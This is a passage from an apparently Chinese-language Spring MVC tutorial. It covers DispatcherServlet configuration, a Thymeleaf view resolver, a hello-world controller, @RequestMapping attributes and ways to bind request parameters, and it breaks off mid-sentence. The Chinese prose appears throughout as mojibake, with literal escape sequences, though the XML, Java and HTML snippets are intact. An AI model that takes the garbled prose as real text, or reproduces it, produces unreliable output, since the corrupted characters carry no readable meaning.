ä¸­è¿›è¡Œé…ç½®ã€‚\n\n#### 3.1 å®šä¹‰DispatcherServlet\n\n##### a>é»˜è®¤é…ç½®æ–¹å¼\n\nSpring MVC åˆå§‹åŒ–æ—¶å°†åœ¨åº”ç”¨ç¨‹åºçš„ WEB-INF ç›®å½•ä¸‹æŸ¥æ‰¾é…ç½®æ–‡ä»¶ï¼Œè¯¥é…ç½®æ–‡ä»¶çš„å‘½åè§„åˆ™æ˜¯â€œ\\<servlet-name>-servlet.xmlâ€\n\nä¾‹å¦‚ï¼Œä»¥ä¸‹é…ç½®æ‰€å¯¹åº”SpringMVCçš„é…ç½®æ–‡ä»¶ä½äºWEB-INFä¸‹ï¼Œæ–‡ä»¶åä¸ºspringMVC-servlet.xml\n\n```xml\n<!-- é…ç½®SpringMVCçš„å‰ç«¯æ§åˆ¶å™¨ï¼Œå¯¹æµè§ˆå™¨å‘é€çš„è¯·æ±‚ç»Ÿä¸€è¿›è¡Œå¤„ç† -->\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    <!--\n        è®¾ç½®springMVCçš„æ ¸å¿ƒæ§åˆ¶å™¨æ‰€èƒ½å¤„ç†çš„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„\n        /æ‰€åŒ¹é…çš„è¯·æ±‚å¯ä»¥æ˜¯/loginæˆ–.htmlæˆ–.jsæˆ–.cssæ–¹å¼çš„è¯·æ±‚è·¯å¾„\n        ä½†æ˜¯/ä¸èƒ½åŒ¹é….jspè¯·æ±‚è·¯å¾„çš„è¯·æ±‚\n    -->\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n```\n\n##### b>æ‰©å±•é…ç½®æ–¹å¼(æ¨è)\n\nä¹Ÿå¯ä»¥å°† Spring MVC çš„é…ç½®æ–‡ä»¶å­˜æ”¾åœ¨åº”ç”¨ç¨‹åºç›®å½•ä¸­çš„ä»»ä½•åœ°æ–¹ï¼Œä½†éœ€è¦ä½¿ç”¨ servlet çš„ init-param å…ƒç´ åŠ è½½é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ contextConfigLocation å‚æ•°æ¥æŒ‡å®š Spring MVC é…ç½®æ–‡ä»¶çš„ä½ç½®\n\n```xml\n<!-- é…ç½®SpringMVCçš„å‰ç«¯æ§åˆ¶å™¨ï¼Œå¯¹æµè§ˆå™¨å‘é€çš„è¯·æ±‚ç»Ÿä¸€è¿›è¡Œå¤„ç† -->\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <!-- é€šè¿‡åˆå§‹åŒ–å‚æ•°æŒ‡å®šSpringMVCé…ç½®æ–‡ä»¶çš„ä½ç½®å’Œåç§° -->\n    <init-param>\n        <!-- contextConfigLocationä¸ºå›ºå®šå€¼ -->\n        <param-name>contextConfigLocation</param-name>\n        <!-- ä½¿ç”¨classpath:è¡¨ç¤ºä»ç±»è·¯å¾„æŸ¥æ‰¾é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚mavenå·¥ç¨‹ä¸­çš„src/main/resources -->\n        <param-value>classpath:springMVC.xml</param-value>\n    </init-param>\n    <!-- \n \t\tä½œä¸ºæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ï¼Œåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­æœ‰å¤§é‡çš„åˆå§‹åŒ–æ“ä½œè¦åš\n\t\tè€Œè¿™äº›æ“ä½œæ”¾åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰æ‰§è¡Œä¼šä¸¥é‡å½±å“è®¿é—®é€Ÿåº¦\n\t\tå› æ­¤éœ€è¦é€šè¿‡æ­¤æ ‡ç­¾å°†å¯åŠ¨æ§åˆ¶DispatcherServletçš„åˆå§‹åŒ–æ—¶é—´æå‰åˆ°æœåŠ¡å™¨å¯åŠ¨æ—¶\n\t-->\n    <load-on-startup>1</load-on-startup><!-- è¡¨ç¤ºå®¹å™¨å†å¯åŠ¨æ—¶ç«‹å³åŠ è½½servlet -->\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    <!--\n        è®¾ç½®springMVCçš„æ ¸å¿ƒæ§åˆ¶å™¨æ‰€èƒ½å¤„ç†çš„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„\n        /æ‰€åŒ¹é…çš„è¯·æ±‚å¯ä»¥æ˜¯/loginæˆ–.htmlæˆ–.jsæˆ–.cssæ–¹å¼çš„è¯·æ±‚è·¯å¾„\n        ä½†æ˜¯/ä¸èƒ½åŒ¹é….jspè¯·æ±‚è·¯å¾„çš„è¯·æ±‚\n    -->\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n```\n\nä¸Šè¿°ä»£ç é…ç½®äº†ä¸€ä¸ªåä¸ºâ€œspringMVCâ€çš„ Servletã€‚è¯¥ Servlet æ˜¯ DispatcherServlet ç±»å‹ï¼Œå®ƒå°±æ˜¯ Spring MVC çš„å…¥å£ï¼Œå¹¶é€šè¿‡ `<load-on-startup>1</load-on-startup>` é…ç½®æ ‡è®°å®¹å™¨åœ¨å¯åŠ¨æ—¶å°±åŠ è½½æ­¤ DispatcherServletï¼Œå³è‡ªåŠ¨å¯åŠ¨ã€‚ç„¶åé€šè¿‡ servlet-mapping æ˜ å°„åˆ°â€œ/â€ï¼Œå³ DispatcherServlet éœ€è¦æˆªè·å¹¶å¤„ç†è¯¥é¡¹ç›®çš„æ‰€æœ‰ URL è¯·æ±‚ã€‚\n\n#### 3.2 åˆ›å»ºSpring MVCé…ç½®æ–‡ä»¶\n\nåœ¨ resources ç›®å½•ä¸‹åˆ›å»º springMVC.xml æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\n\n```xml\n<!-- è‡ªåŠ¨æ‰«æåŒ… -->\n<context:component-scan base-package=\"com.jwt.mvc.controller\"/>\n\n<!-- é…ç½®Thymeleafè§†å›¾è§£æå™¨ -->\n<bean id=\"viewResolver\" class=\"org.thymeleaf.spring5.view.ThymeleafViewResolver\">\n    <property name=\"order\" value=\"1\"/>\n    <property name=\"characterEncoding\" value=\"UTF-8\"/>\n    <property name=\"templateEngine\">\n        <bean class=\"org.thymeleaf.spring5.SpringTemplateEngine\">\n            <property name=\"templateResolver\">\n                <bean class=\"org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver\">\n    \n                    <!-- è§†å›¾å‰ç¼€ -->\n                    <property name=\"prefix\" value=\"/WEB-INF/templates/\"/>\n    \n                    <!-- è§†å›¾åç¼€ -->\n                    <property name=\"suffix\" value=\".html\"/>\n                    <property name=\"templateMode\" value=\"HTML5\"/>\n                    <property name=\"characterEncoding\" value=\"UTF-8\" />\n                </bean>\n            </property>\n        </bean>\n    </property>\n</bean>\n\n<!-- \n   å¤„ç†é™æ€èµ„æºï¼Œä¾‹å¦‚htmlã€jsã€cssã€jpg\n  è‹¥åªè®¾ç½®è¯¥æ ‡ç­¾ï¼Œåˆ™åªèƒ½è®¿é—®é™æ€èµ„æºï¼Œå…¶ä»–è¯·æ±‚åˆ™æ— æ³•è®¿é—®\n  æ­¤æ—¶å¿…é¡»è®¾ç½®<mvc:annotation-driven/>è§£å†³é—®é¢˜\n -->\n<mvc:default-servlet-handler/>\n\n<!-- å¼€å¯mvcæ³¨è§£é©±åŠ¨ -->\n<mvc:annotation-driven>\n    <mvc:message-converters>\n        <!-- å¤„ç†å“åº”ä¸­æ–‡å†…å®¹ä¹±ç  -->\n        <bean class=\"org.springframework.http.converter.StringHttpMessageConverter\">\n            <property name=\"defaultCharset\" value=\"UTF-8\" />\n            <property name=\"supportedMediaTypes\">\n                <list>\n                    <value>text/html</value>\n                    <value>application/json</value>\n                </list>\n            </property>\n        </bean>\n    </mvc:message-converters>\n</mvc:annotation-driven>\n```\n\n### 4ã€åˆ›å»º Controller\n\nç”±äºå‰ç«¯æ§åˆ¶å™¨å¯¹æµè§ˆå™¨å‘é€çš„è¯·æ±‚è¿›è¡Œäº†ç»Ÿä¸€çš„å¤„ç†ï¼Œä½†æ˜¯å…·ä½“çš„è¯·æ±‚æœ‰ä¸åŒçš„å¤„ç†è¿‡ç¨‹ï¼Œå› æ­¤éœ€è¦åˆ›å»ºå¤„ç†å…·ä½“è¯·æ±‚çš„ç±»ï¼Œå³è¯·æ±‚æ§åˆ¶å™¨ã€‚è¯·æ±‚æ§åˆ¶å™¨ä¸­æ¯ä¸€ä¸ªå¤„ç†è¯·æ±‚çš„æ–¹æ³•æˆä¸ºæ§åˆ¶å™¨æ–¹æ³•\n\nå› ä¸º SpringMVC çš„æ§åˆ¶å™¨ç”±ä¸€ä¸ª POJOï¼ˆæ™®é€šçš„Javaç±»ï¼‰æ‹…ä»»ï¼Œå› æ­¤éœ€è¦é€šè¿‡ @Controller æ³¨è§£å°†å…¶æ ‡è¯†ä¸ºä¸€ä¸ªæ§åˆ¶å±‚ç»„ä»¶ï¼Œäº¤ç»™ Spring çš„ IoC å®¹å™¨ç®¡ç†ï¼Œæ­¤æ—¶ SpringMVC æ‰èƒ½å¤Ÿè¯†åˆ«æ§åˆ¶å™¨çš„å­˜åœ¨\n\n```java\n//åˆ›å»ºè¯·æ±‚æ§åˆ¶å™¨\n@Controller\npublic class HelloController {\n  \n    // @RequestMappingæ³¨è§£ï¼šå¤„ç†è¯·æ±‚å’Œæ§åˆ¶å™¨æ–¹æ³•ä¹‹é—´çš„æ˜ å°„å…³ç³»\n    // localhost:8080/springMVC/\n    @RequestMapping(\"/\")\n    public String index() {//æ§åˆ¶å™¨æ–¹æ³•\n        //è®¾ç½®è§†å›¾åç§°\n        return \"index\";\n    }\n}\n```\n\n### 5ã€åˆ›å»º View\n\næ ¹æ®ä¸Šé¢è®¾ç½®çš„è§†å›¾å‰åç¼€ï¼Œåœ¨ WEB-INF ä¸‹æ–°å»º templates æ–‡ä»¶å¤¹ï¼Œåœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹æ–°å»º index.htmlï¼Œå¹¶æ·»åŠ  Thymeleaf å‘½åç©ºé—´ `xmlns:th=\"http://www.thymeleaf.org\"`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>é¦–é¡µ</title>\n</head>\n<body>\n<h1>é¦–é¡µ</h1>\n<h2>Hello World</h2>\n</body>\n</html>\n```\n\n### 6ã€éƒ¨ç½²è¿è¡Œ\n\nå°†é¡¹ç›®éƒ¨ç½²åˆ° Tomcat æœåŠ¡å™¨ï¼Œç‚¹å‡»è¿è¡Œ\n\næ³¨ï¼šURL è·¯å¾„è¦å’Œéƒ¨ç½²é‡Œé¢çš„åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ä¸€è‡´\n\n| Tomcaté…ç½®                                                   | è¿è¡Œæ•ˆæœ                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220425230553885.png) | ![](https://img.jwt1399.top/img/image-20220425230438186.png) |\n\n### 7ã€æ€»ç»“\n\n- 1ã€æµè§ˆå™¨å‘é€è¯·æ±‚ï¼Œè‹¥è¯·æ±‚åœ°å€ç¬¦åˆå‰ç«¯æ§åˆ¶å™¨çš„ url-patternï¼Œè¯¥è¯·æ±‚å°±ä¼šè¢«å‰ç«¯æ§åˆ¶å™¨DispatcherServlet å¤„ç†ã€‚\n\n- 2ã€å‰ç«¯æ§åˆ¶å™¨ä¼šè¯»å– SpringMVC çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œé€šè¿‡æ‰«æç»„ä»¶æ‰¾åˆ°æ§åˆ¶å™¨ï¼Œå°†è¯·æ±‚åœ°å€å’Œæ§åˆ¶å™¨ä¸­ @RequestMapping æ³¨è§£çš„ value å±æ€§å€¼è¿›è¡ŒåŒ¹é…ï¼Œè‹¥åŒ¹é…æˆåŠŸï¼Œè¯¥æ³¨è§£æ‰€æ ‡è¯†çš„æ§åˆ¶å™¨æ–¹æ³•å°±æ˜¯å¤„ç†è¯·æ±‚çš„æ–¹æ³•ã€‚\n\n- 3ã€å¤„ç†è¯·æ±‚çš„æ–¹æ³•éœ€è¦è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„è§†å›¾åç§°ï¼Œè¯¥è§†å›¾åç§°ä¼šè¢«è§†å›¾è§£æå™¨è§£æï¼ŒåŠ ä¸Šå‰ç¼€å’Œåç¼€ç»„æˆè§†å›¾çš„è·¯å¾„ï¼Œé€šè¿‡ Thymeleaf å¯¹è§†å›¾è¿›è¡Œæ¸²æŸ“ï¼Œæœ€ç»ˆè½¬å‘åˆ°è§†å›¾æ‰€å¯¹åº”é¡µé¢ã€‚\n\n## ä¸‰ã€@RequestMappingæ³¨è§£\n\n> @RequestMappingæ³¨è§£çš„ä½œç”¨å°±æ˜¯å°†è¯·æ±‚å’Œå¤„ç†è¯·æ±‚çš„æ§åˆ¶å™¨æ–¹æ³•å…³è”èµ·æ¥ï¼Œå»ºç«‹æ˜ å°„å…³ç³»ã€‚SpringMVC æ¥æ”¶åˆ°æŒ‡å®šçš„è¯·æ±‚ï¼Œå°±ä¼šæ¥æ‰¾åˆ°åœ¨æ˜ å°„å…³ç³»ä¸­å¯¹åº”çš„æ§åˆ¶å™¨æ–¹æ³•æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚ã€‚\n\n### 1ã€æ³¨è§£ä½ç½®\n\n- @RequestMappingæ”¾åœ¨ç±»ä¸Šï¼šè®¾ç½®æ˜ å°„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„çš„åˆå§‹ä¿¡æ¯\n\n- @RequestMappingæ”¾åœ¨æ–¹æ³•ä¸Šï¼šè®¾ç½®æ˜ å°„è¯·æ±‚è¯·æ±‚è·¯å¾„çš„å…·ä½“ä¿¡æ¯\n\n```java\n@Controller\n@RequestMapping(\"/test\")\npublic class RequestMappingController {\n    @RequestMapping(\"/testRequestMapping\")\n    public String testRequestMapping(){\n        return \"success\";\n    }\n}\n```\n\næ­¤æ—¶è¯·æ±‚æ˜ å°„æ‰€æ˜ å°„çš„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„ä¸ºï¼š/test/testRequestMapping\n\n### 2ã€valueå±æ€§\n\n- @RequestMappingæ³¨è§£çš„valueå±æ€§é€šè¿‡è¯·æ±‚çš„**è¯·æ±‚åœ°å€**åŒ¹é…è¯·æ±‚æ˜ å°„\n\n- valueå±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚æ˜ å°„èƒ½å¤ŸåŒ¹é…å¤šä¸ªè¯·æ±‚åœ°å€æ‰€å¯¹åº”çš„è¯·æ±‚ï¼Œvalueå±æ€§å¿…é¡»è®¾ç½®\n\n```html\n<a th:href=\"@{/test1}\">æµ‹è¯•valueå±æ€§-->/test1</a>\n<br>\n<a th:href=\"@{/test2}\">æµ‹è¯•valueå±æ€§-->/test2</a><br>\n```\n\n```java\n@RequestMapping(value = {\"/test1\", \"/test2\"})\npublic String testRequestMapping(){\n    return \"success\";\n}\n```\n\n### 3ã€methodå±æ€§\n\n- @RequestMappingæ³¨è§£çš„methodå±æ€§é€šè¿‡è¯·æ±‚çš„**è¯·æ±‚æ–¹å¼**ï¼ˆgetæˆ–postï¼‰åŒ¹é…è¯·æ±‚æ˜ å°„\n\n- methodå±æ€§æ˜¯ä¸€ä¸ªRequestMethodç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚æ˜ å°„èƒ½å¤ŸåŒ¹é…å¤šç§è¯·æ±‚æ–¹å¼çš„è¯·æ±‚\n- è‹¥å½“å‰è¯·æ±‚çš„è¯·æ±‚åœ°å€æ»¡è¶³è¯·æ±‚æ˜ å°„çš„valueå±æ€§ï¼Œä½†æ˜¯è¯·æ±‚æ–¹å¼ä¸æ»¡è¶³methodå±æ€§ï¼Œåˆ™æµè§ˆå™¨æŠ¥é”™405ï¼šRequest method 'POST' not supported\n\n```html\n<a th:href=\"@{/test}\">æµ‹è¯•valueå±æ€§</a>\n<br>\n<form th:action=\"@{/test}\" method=\"post\">\n    <input type=\"submit\">\n</form>\n```\n\n```java\n@RequestMapping(\n        value = {\"/test\"},\n        method = {RequestMethod.GET, RequestMethod.POST}\n)\npublic String testRequestMapping(){\n    return \"success\";\n}\n```\n\nå¯¹äºå¤„ç†æŒ‡å®šè¯·æ±‚æ–¹å¼çš„æ§åˆ¶å™¨æ–¹æ³•ï¼ŒSpringMVCä¸­æä¾›äº†@RequestMappingçš„æ´¾ç”Ÿæ³¨è§£\n\n- å¤„ç†getè¯·æ±‚çš„æ˜ å°„-->@GetMapping\n\n- å¤„ç†postè¯·æ±‚çš„æ˜ å°„-->@PostMapping\n\n- å¤„ç†putè¯·æ±‚çš„æ˜ å°„-->@PutMapping\n\n- å¤„ç†deleteè¯·æ±‚çš„æ˜ å°„-->@DeleteMapping\n\n```html\n<form th:action=\"@{/test}\" method=\"post\">\n    <input type=\"submit\">\n</form>\n```\n\n```java\n@PostMapping(\"/test\")\npublic String testRequestMapping(){\n\treturn \"success\";\n}\n```\n\n### 4ã€paramså±æ€§\n\n- @RequestMappingæ³¨è§£çš„paramså±æ€§é€šè¿‡è¯·æ±‚çš„**è¯·æ±‚å‚æ•°**åŒ¹é…è¯·æ±‚æ˜ å°„\n\n- paramså±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°ç»„ï¼Œå¯ä»¥é€šè¿‡å››ç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±‚å‚æ•°å’Œè¯·æ±‚æ˜ å°„çš„åŒ¹é…å…³ç³»\n\n  - \"param\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•°\n\n  - \"!param\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚ä¸èƒ½æºå¸¦paramè¯·æ±‚å‚æ•°\n  - \"param=value\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•°ä¸”param=value\n\n  - \"param!=value\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•°ä½†æ˜¯param!=value\n\n- è‹¥å½“å‰è¯·æ±‚æ»¡è¶³valueå’Œmethodå±æ€§ï¼Œä½†æ˜¯ä¸æ»¡è¶³paramså±æ€§ï¼Œæ­¤æ—¶é¡µé¢å›æŠ¥é”™400ï¼šParameter conditions \"username, password!=123456\" not met for actual request parameters: username={admin}, password={123456}\n\n```html\n<a th:href=\"@{/test(username='admin',password=123)}\">æµ‹è¯•paramså±æ€§</a>\n<!--æˆ–è€…-->\n<a th:href=\"@{/test?username=admin&password=123}\">æµ‹è¯•paramså±æ€§</a>\n```\n\n```java\n@RequestMapping(\n  value = {\"/testRequestMapping\", \"/test\"},\n  method = {RequestMethod.GET, RequestMethod.POST},\n  params = {\"username\",\"password!=123456\"}\n)\npublic String testRequestMapping(){\n  return \"success\";\n}\n```\n\n### 5ã€headerså±æ€§\n\n- @RequestMappingæ³¨è§£çš„headerså±æ€§é€šè¿‡è¯·æ±‚çš„**è¯·æ±‚å¤´ä¿¡æ¯**åŒ¹é…è¯·æ±‚æ˜ å°„\n\n- headerså±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°ç»„ï¼Œå¯ä»¥é€šè¿‡å››ç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±‚å¤´ä¿¡æ¯å’Œè¯·æ±‚æ˜ å°„çš„åŒ¹é…å…³ç³»\n\n  - \"header\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦headerè¯·æ±‚å¤´ä¿¡æ¯\n\n  - \"!header\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚ä¸èƒ½æºå¸¦headerè¯·æ±‚å¤´ä¿¡æ¯\n\n  - \"header=value\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦headerè¯·æ±‚å¤´ä¿¡æ¯ä¸”header=value\n\n  - \"header!=value\"ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦headerè¯·æ±‚å¤´ä¿¡æ¯ä¸”header!=value\n\n- è‹¥å½“å‰è¯·æ±‚æ»¡è¶³@RequestMappingæ³¨è§£çš„valueå’Œmethodå±æ€§ï¼Œä½†æ˜¯ä¸æ»¡è¶³headerså±æ€§ï¼Œæ­¤æ—¶é¡µé¢æ˜¾ç¤º404é”™è¯¯ï¼Œå³èµ„æºæœªæ‰¾åˆ°\n\n```java\n    @RequestMapping(\n            value = {\"/testRequestMapping\", \"/test\"},\n            method = {RequestMethod.GET, RequestMethod.POST},\n            headers = {\"host=localhost:8080\"}\n    )\n    public String testRequestMapping(){\n        return \"success\";\n    }\n```\n\n### 6ã€anté£æ ¼è·¯å¾„\n\n- ï¼Ÿï¼šè¡¨ç¤ºä»»æ„çš„å•ä¸ªå­—ç¬¦\n\n```html\n<a th:href=\"@{/test}\">æµ‹è¯•/test</a><br>\n<a th:href=\"@{/tast}\">æµ‹è¯•/tast</a><br>\n```\n\n```java\n@RequestMapping(\"/t?st\")\npublic String testRequestMapping(){\n  return \"success\";\n}\n```\n\n- *ï¼šè¡¨ç¤ºä»»æ„çš„0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦\n\n```html\n<a th:href=\"@{/tst}\">æµ‹è¯•/tst</a><br>\n<a th:href=\"@{/test}\">æµ‹è¯•/test</a><br>\n<a th:href=\"@{/tast}\">æµ‹è¯•/teest</a><br>\n```\n\n```java\n@RequestMapping(\"/t*st\")\npublic String testRequestMapping(){\n\treturn \"success\";\n}\n```\n\n- \\**ï¼šè¡¨ç¤ºä»»æ„çš„ä¸€å±‚æˆ–å¤šå±‚ç›®å½•\n\n```html\n<a th:href=\"@{/a/test}\">æµ‹è¯•/a/test</a><br>\n<a th:href=\"@{/b/test}\">æµ‹è¯•/b/test</a><br>\n<a th:href=\"@{/a/b/test}\">æµ‹è¯•/a/b/test</a><br>\n<a th:href=\"@{/test}\">æµ‹è¯•/test</a><br>\n```\n\n```java\n@RequestMapping(\"/**/test\")\npublic String testRequestMapping(){\n  return \"success\";\n}\n```\n\n### 7ã€PathVariable\n\n- åŸå§‹æ–¹å¼ï¼š/deleteUser?id=1\n\n- RESTæ–¹å¼ï¼š/deleteUser/1\n\nSpringMVCè·¯å¾„ä¸­çš„å ä½ç¬¦å¸¸ç”¨äºRESTfulé£æ ¼ä¸­ï¼Œå½“è¯·æ±‚è·¯å¾„ä¸­å°†æŸäº›æ•°æ®é€šè¿‡è·¯å¾„çš„æ–¹å¼ä¼ è¾“åˆ°æœåŠ¡å™¨ä¸­ï¼Œå°±å¯ä»¥åœ¨ç›¸åº”çš„@RequestMappingæ³¨è§£çš„valueå±æ€§ä¸­é€šè¿‡å ä½ç¬¦{xxx}è¡¨ç¤ºä¼ è¾“çš„æ•°æ®ï¼Œå†é€šè¿‡@PathVariableæ³¨è§£ï¼Œå°†å ä½ç¬¦æ‰€è¡¨ç¤ºçš„æ•°æ®èµ‹å€¼ç»™æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚\n\n```html\n<a th:href=\"@{/testRest/1/admin}\">æµ‹è¯•è·¯å¾„ä¸­çš„å ä½ç¬¦-->/testRest</a><br>\n```\n\n```java\n@RequestMapping(\"/testRest/{id}/{username}\")\npublic String testRest(@PathVariable(\"id\") String id, @PathVariable(\"username\") String username){\n    System.out.println(\"id:\"+id+\",username:\"+username);\n    return \"success\";\n}\n//æœ€ç»ˆè¾“å‡ºçš„å†…å®¹ä¸º --> id:1,username:admin\n```\n\n## å››ã€SpringMVCè·å–è¯·æ±‚å‚æ•°\n\n### 1ã€é€šè¿‡ServletAPIè·å–\n\nå°†HttpServletRequestä½œä¸ºæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ï¼Œæ­¤æ—¶HttpServletRequestç±»å‹çš„å‚æ•°è¡¨ç¤ºå°è£…äº†å½“å‰è¯·æ±‚çš„è¯·æ±‚æŠ¥æ–‡çš„å¯¹è±¡\n\n```html\n<a th:href=\"@{/testParam(username='admin',password=123456)}\">æµ‹è¯•è·å–è¯·æ±‚å‚æ•°</a>\n```\n\n```java\n@RequestMapping(\"/testParam\")\npublic String testParam(HttpServletRequest request){\n    String username = request.getParameter(\"username\");\n    String password = request.getParameter(\"password\");\n    System.out.println(\"username:\"+username+\",password:\"+password);\n    return \"success\";\n}\n```\n\n### 2ã€é€šè¿‡æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚è·å–\n\nåœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä½ç½®ï¼Œ**è®¾ç½®å’Œè¯·æ±‚å‚æ•°åŒåçš„å½¢å‚**ï¼Œå½“æµè§ˆå™¨å‘é€è¯·æ±‚ï¼ŒåŒ¹é…åˆ°è¯·æ±‚æ˜ å°„æ—¶ï¼Œåœ¨DispatcherServletä¸­å°±ä¼šå°†è¯·æ±‚å‚æ•°èµ‹å€¼ç»™ç›¸åº”çš„å½¢å‚\n\n```html\n<a th:href=\"@{/testParam(username='admin',password=123456)}\">æµ‹è¯•è·å–è¯·æ±‚å‚æ•°</a>\n```\n\n```java\n@RequestMapping(\"/testParam\")\npublic String testParam(String username, String password){\n    System.out.println(\"username:\"+username+\",password:\"+password);\n    return \"success\";\n}\n```\n\nè‹¥è¯·æ±‚æ‰€ä¼ è¾“çš„è¯·æ±‚å‚æ•°ä¸­æœ‰å¤šä¸ªåŒåçš„è¯·æ±‚å‚æ•°ï¼Œæ­¤æ—¶å¯ä»¥åœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä¸­è®¾ç½®å­—ç¬¦ä¸²æ•°ç»„æˆ–è€…å­—ç¬¦ä¸²ç±»å‹çš„å½¢å‚æ¥æ”¶æ­¤è¯·æ±‚å‚æ•°\n\n```html\n<a th:href=\"@{/testParam(hobby='a',hobby='b')}\">æµ‹è¯•</a>\n```\n\n- è‹¥ä½¿ç”¨å­—ç¬¦ä¸²æ•°ç»„ç±»å‹çš„å½¢å‚ï¼Œæ­¤å‚æ•°çš„æ•°ç»„ä¸­åŒ…å«äº†æ¯ä¸€ä¸ªæ•°æ®\n\n```java\n@RequestMapping(\"/testParam\")\n  public String testParam(String username, String password, String[] hobby){\n    System.out.println(\"username:\"+username+\",password:\"+password+\",hobby:\"+ Arrays.toString(hobby));\n    return \"success\";\n}\n\n//è¾“å‡ºï¼šhobby:[a, b]\n```\n\n- è‹¥ä½¿ç”¨å­—ç¬¦ä¸²ç±»å‹çš„å½¢å‚ï¼Œæ­¤å‚æ•°çš„å€¼ä¸ºæ¯ä¸ªæ•°æ®ä¸­é—´ä½¿ç”¨é€—å·æ‹¼æ¥çš„ç»“æœ\n\n```java\n@RequestMapping(\"/testParam\")\npublic String testParam(String username, String password, String hobby){\n System.out.println(\"username:\"+username+\",password:\"+password+\",hobby:\"+hobby);\n  return \"success\";\n}\n\n//è¾“å‡ºï¼šhobby:a,b\n```\n\n### 3ã€@RequestParam\n\n> ä¸Šé¢é€šè¿‡æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚è·å–è¯·æ±‚å‚æ•°ï¼Œ**å¿…é¡»è®¾ç½®æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚å’Œè¯·æ±‚å‚æ•°åŒå**ï¼Œä¸åŒååˆ™è·å–ä¸åˆ°è¯·æ±‚å‚æ•°ï¼Œé€šè¿‡@RequestParamæ³¨è§£å¯ä»¥å®ç°ä¸åŒåä¹Ÿå¯è·å–\n\n@RequestParamæ˜¯å°†**è¯·æ±‚å‚æ•°**å’Œ**æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚**åˆ›å»ºæ˜ å°„å…³ç³»\n\n@RequestParamæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼š\n\n- valueï¼šæŒ‡å®šä¸ºå½¢å‚èµ‹å€¼çš„è¯·æ±‚å‚æ•°çš„å‚æ•°å\n\n- requiredï¼šè®¾ç½®æ˜¯å¦å¿…é¡»ä¼ è¾“æ­¤è¯·æ±‚å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºtrue\n  - è‹¥è®¾ç½®ä¸ºtrueæ—¶ï¼Œåˆ™å½“å‰è¯·æ±‚å¿…é¡»ä¼ è¾“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°ï¼Œè‹¥æ²¡æœ‰ä¼ è¾“è¯¥è¯·æ±‚å‚æ•°ä¸”æ²¡æœ‰è®¾ç½®defaultValueå±æ€§ï¼Œåˆ™é¡µé¢æŠ¥é”™400ï¼šRequired String parameter 'xxx' is not presentï¼›\n  - è‹¥è®¾ç½®ä¸ºfalseï¼Œåˆ™å½“å‰è¯·æ±‚ä¸æ˜¯å¿…é¡»ä¼ 